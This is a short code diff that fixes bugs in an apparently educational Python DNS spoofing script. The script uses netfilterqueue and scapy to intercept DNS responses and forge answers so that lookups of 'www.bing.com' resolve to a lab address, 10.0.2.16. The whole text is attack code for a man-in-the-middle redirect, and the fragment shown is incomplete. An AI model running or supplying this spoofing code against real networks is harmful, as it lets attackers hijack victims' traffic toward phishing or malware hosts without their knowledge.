@@ -5,13 +5,13 @@
 import netfilterqueue
 import scapy.all as scapy
 
-def process_packet:
+def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(DNSRR):
+    if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
         if "www.bing.com" in qname:
             print("[+] Spoofing target:")
-            answer = sacpy.DNSRR(rrname=qname, rdata="10.0.2.16")
+            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.16")
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
 
